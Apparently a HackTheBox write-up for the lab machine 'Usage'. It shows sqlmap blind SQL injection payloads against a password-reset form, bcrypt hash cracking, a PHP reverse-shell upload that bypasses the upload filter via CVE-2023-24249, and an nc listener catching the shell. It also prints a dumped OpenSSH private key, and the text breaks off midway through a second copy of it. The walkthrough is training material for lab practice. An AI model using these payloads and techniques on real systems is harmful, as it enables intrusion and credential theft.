---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - Laravel
  - LaravelFramework
  - SQLInjection
  - SQLi
  - Boolean-BasedBlindSQLInjection
  - CVE-2023-24249
  - ArbitraryFileUpload
  - UploadFilterBypass
  - PasswordReuse
  - LinuxWildcards
  - 7-Zip
---

![](images/Usage.png)

## Summary

The box starts with a `Boolean-Based Blind SQL Injection (SQLi)` on the `password reset` endpoint of the `web application`. By using `sqlmap` the database can be dumped fairly easy after some time. The database contains a `hash` for a user called `Administrator`. After cracking the hash and using `admin` instead of `Administrator` on the `subdomain` called `admin.usage.htb`, which can be found by clicking on `Admin` in the `upper right corner`, a login on the `Laravel Admin Dashboard` is possible. The version of the `Laravel Admin Dashboard` is `1.8.17` which is vulnerable to `CVE-2023-24249`. The vulnerability allows to `upload arbitrary files` on the users `profile picture`. By uploading a `PHP reverse shell` with an appended `.png` file extension, the `upload filter` can be `bypassed` after `intercepting` the `request` and changing back the file extension to `.php`. After getting a shell as the user `dash` the `user.txt` can be obtained. In his `home directory` a file called `.monirc` can be found, which contains `credentials` for a user called `admin`. By checking the `/home` directory another user called `xander` appears. By `reusing` the password from the `.monirc` the `privileges` can be `elevated` to `xander`. The new user has the capability to execute `/usr/bin/usage_management` with `sudo`. A quick `strings` against the binary reveals that it uses `7-Zip` together with `Linux Wildcards`. By linking the `root.txt` or the `id_rsa` key of root and then executing the binary and choosing option `1`, the `root flag` and also the `SSH Key` can be displayed in the output.

## Table of Contents

- [Reconnaissance](#reconnaissance)
    - [Enumeration of Port 80/TCP](#enumeration-of-port-80tcp)
- [Boolean-Based Blind SQL Injection (SQLi)](#boolean-based-blind-sql-injection-sqli)
- [Cracking the Hash](#cracking-the-hash)
- [Laravel Admin Dashboard](#laravel-admindashboard)
- [Foothold](#foothold)
    - [CVE-2023-24249 Arbitrary File Upload](#cve-2023-24249-arbitrary-file-upload)
- [Stabilizing Shell](#stabilizing-shell)
- [Enumeration](#enumeration)
- [user.txt](#usertxt)
- [Persistence](#persistence)
- [Privilege Escalation to xander through Password Reuse](#privilege-escalation-to-xander-through-password-reuse)
- [Privilege Escalation to root using Linux Wildcards](#privilege-escalation-to-root-using-linux-wildcards)
- [root.txt](#roottxt)
- [Post Exploitation](#post-exploitation)

## Reconnaissance

As always we started doing `reconnaissance` with some basic `Nmap` scans. Only port `80/TCP` and port `22/TCP` were present.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.44.202
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 15:00 EDT
Nmap scan report for 10.129.44.202
Host is up (0.090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.44.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 15:11 EDT
Nmap scan report for usage.htb (10.129.44.202)
Host is up (0.100s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Daily Blogs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2590.75 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.44.202
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 16:03 EDT
Nmap scan report for usage.htb (10.129.44.202)
Host is up (0.10s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1120.55 seconds
```

### Enumeration of Port 80/TCP

Accessing the website on port `80/TCP` redirected us to `http://usage.htb` which we added to our `/etc/hosts` file.

- [http://10.129.44.202/](http://10.129.44.202/)
- [http://usage.htb](http://usage.htb)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.44.202   usage.htb
```

After doing so we were greeted with a `login page` with a `password reset option` and also some options to `register` a new user or to `login` as an `administrative user`.

![](images/2024-04-13_15-02_website.png)

As we tried to access the `admin endpoint`, we got redirected again to a subdomain called `http://admin.usage.htb` which we also added to our list.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.44.202   usage.htb
10.129.44.202   admin.usage.htb
```

- [http://admin.usage.htb/](http://admin.usage.htb/)

Since we had no credentials yet, we checked the `application stack` using `WhatWeb` and found a running `Laravel Framework` sticking out.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://usage.htb/
http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.129.44.202], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

We registered a new user and logged in but found nothing than useless blog posts written by some sort of an `AI`.

![](images/2024-04-13_15-06_register.png)

We played around with the `password reset` option until we started looking for attacks like `SQL Injection (SQLi)`.

![](2024-04-13_15-06_password_reset.png)

## Boolean-Based Blind SQL Injection (SQLi)

At first we tried basic stuff using `sqlmap` but at some point, `Yeeb` got a hit for a `boolean-based blind SQL Injection` and we updated our commands, to dump the database.

```c
<---CUT FOR BREVITY --->  
[19:20:07] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive                                                     
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]                                                        
sqlmap identified the following injection point(s) with a total of 739 HTTP(s) requests:                                                                   
---

Parameter: #1* ((custom) POST)                                                                                                                             
    Type: boolean-based blind                                                                                                                              
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)                                                                           
    Payload: _token=1vm38trtTWSsqEyha1W8pA01u2WN1nMP7rPjftIn&email=yeeb@yeeb.xyz' AND 9578=(SELECT (CASE WHEN (9578=9578) THEN 9578 ELSE (SELECT 1338 UNION
 SELECT 1438) END))-- PYsz                                                                                                                                 
    Type: time-based blind                                                                                                                                 
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)                                                                                                 
    Payload: _token=1vm38trtTWSsqEyha1W8pA01u2WN1nMP7rPjftIn&email=yeeb@yeeb.xyz' AND 6611=BENCHMARK(5000000,MD5(0x785a694c))-- QyVf
<---CUT FOR BREVITY --->  
```

Here is the final command we put together to `dump` the `hash` of the user `Administrator`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ sqlmap -r request.req --level 5 --risk 3 -D usage_blog -T admin_users -C name,password --dump  --batch             
        ___
       __H__                                                                     
 ___ ___[(]_____ ___ ___  {1.8.3#stable}                                         
|_ -| . ["]     | .'| . |                                                        
|___|_  ["]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:52:00 /2024-04-13/

[15:52:00] [INFO] parsing HTTP request from 'request.req'
POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
Cookie parameter 'XSRF-TOKEN' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[15:52:00] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[15:52:01] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[15:52:02] [WARNING] POST parameter '_token' does not appear to be dynamic
[15:52:02] [WARNING] heuristic (basic) test shows that POST parameter '_token' might not be injectable
[15:52:02] [INFO] testing for SQL injection on POST parameter '_token'
[15:52:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:52:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:52:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:52:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause
<--- CUT FOR BREVITY --->
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
<--- CUT FOR BREVITY --->
[16:10:03] [INFO] testing for SQL injection on POST parameter 'email'
[16:10:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:10:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:11:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:12:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:12:17] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[16:12:20] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[16:12:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:12:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:12:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:12:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
<--- CUT FOR BREVITY --->
[16:12:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[16:12:31] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[16:12:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[16:12:32] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[16:12:33] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[16:13:14] [INFO] POST parameter 'email' appears to be 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' injectable 
[16:13:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:13:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:13:15] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:13:16] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[16:13:55] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[16:13:58] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[16:14:42] [INFO] testing 'Generic UNION query (98) - 21 to 40 columns'
[16:14:45] [INFO] testing 'Generic UNION query (98) - 41 to 60 columns'
[16:14:47] [INFO] testing 'Generic UNION query (98) - 61 to 80 columns'
[16:14:50] [INFO] testing 'Generic UNION query (98) - 81 to 100 columns'
[16:14:53] [INFO] testing 'MySQL UNION query (98) - 1 to 20 columns'
[16:15:20] [INFO] testing 'MySQL UNION query (98) - 21 to 40 columns'
[16:15:23] [INFO] testing 'MySQL UNION query (98) - 41 to 60 columns'
[16:15:25] [INFO] testing 'MySQL UNION query (98) - 61 to 80 columns'
[16:15:29] [INFO] testing 'MySQL UNION query (98) - 81 to 100 columns'
[16:15:31] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 9634 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=I8tkgP7AiWH9qxEWEPiDaradDwBKcAQ3gRQutuOg&email=foobar@foobar.local' AND 7627=(SELECT (CASE WHEN (7627=7627) THEN 7627 ELSE (SELECT 6947 UNION SELECT 8687) END))-- zPyH

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=I8tkgP7AiWH9qxEWEPiDaradDwBKcAQ3gRQutuOg&email=foobar@foobar.local' AND 5625=BENCHMARK(5000000,MD5(0x6e624d6d))-- mpQB
---
[16:15:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL < 5.0.12
[16:15:41] [INFO] fetching entries of column(s) '`name`,password' for table 'admin_users' in database 'usage_blog'
[16:15:41] [INFO] fetching number of column(s) '`name`,password' entries for table 'admin_users' in database 'usage_blog'
[16:15:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[16:15:41] [INFO] retrieved: 1
[16:15:43] [INFO] retrieved: Administrator
[16:16:16] [INFO] retrieved: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
Database: usage_blog
Table: admin_users
[1 entry]
+---------------+--------------------------------------------------------------+
| name          | password                                                     |
+---------------+--------------------------------------------------------------+
| Administrator | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+---------------+--------------------------------------------------------------+

[16:19:05] [INFO] table 'usage_blog.admin_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv'
[16:19:05] [WARNING] HTTP error codes detected during run:
419 (?) - 8895 times, 500 (Internal Server Error) - 601 times
[16:19:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 16:19:05 /2024-04-13/
```

## Cracking the Hash

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ cat hash
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:12 DONE (2024-04-13 16:39) 0.08257g/s 133.7p/s 133.7c/s 133.7C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password  |
| --------- |
| whatever1 |

## Laravel Admin Dashboard

Since we couldn't login as `Administrator`, we tried `admin` and got lucky.

| Username | Password  |
| -------- | --------- |
| admin    | whatever1 |

![](images/2024-04-13_15-59_admin_dashboard.png)

## Foothold

### CVE-2023-24249 Arbitrary File Upload

After poking around for a little bit, we noticed that we could upload a new `profile picture` for the user `admin` and by checking the version of the `Laravel Admin Dashboard` on the bottom right corner `(1.8.17)` we found a `CVE`, matching for version `1.8.19`. So we had the chance that the vulnerability already existed in earlier versions too.

- [https://github.com/advisories/GHSA-g857-47pm-3r32](https://github.com/advisories/GHSA-g857-47pm-3r32)
- [https://flyd.uk/post/cve-2023-24249/](https://flyd.uk/post/cve-2023-24249/)
- [https://github.com/ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell)

To `bypass` the `upload filter` we needed to add `.png` at the end of our `reverse shell`, `intercept the request` to `upload the shell` and `switch back` the extension to `.php` only.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ mv php_reverse_shell.php php_reverse_shell.php.png
```

![](images/2024-04-13_16-32_request.png)

![](images/2024-04-13_16-32_request_modified.png)

![](images/2024-04-13_15-59_admin_dashboard_file_upload_bypass.png)

To trigger the payload we updated the `URL` on which uploaded files get stored to match our `reverse shell file name`. We found this `URL` by clicking on the `download icon` of the `original profile picture`.

- [http://admin.usage.htb/vendor/laravel-admin/AdminLTE/dist/img/php_reverse_shell.php](http://admin.usage.htb/vendor/laravel-admin/AdminLTE/dist/img/php_reverse_shell.php)

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.44.202] 52036
SOCKET: Shell has connected! PID: 49069
id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

## Stabilizing Shell

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
zsh: suspended  nc -lnvp 9000
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9000

dash@usage:/var/www/html/project_admin/public/uploads/images$ 
<oject_admin/public/uploads/images$ export XTERM=xterm                       
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

## Enumeration

We started with some basic enumeration and figured out that our user `dash`, actually had a `home directory` in which we found the `user.txt`.

```c
dash@usage:/var/www/html/project_admin/public/uploads/images$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

```c
dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
```

## user.txt

```c
dash@usage:~$ cat user.txt 
30818d1bf7767f93371a825ea78dc0e6
```

## Persistence

The user also had a `SSH Key` present which we used conveniently to access a fully working shell.

```c
dash@usage:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Usage/files]
└─$ cat dash_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
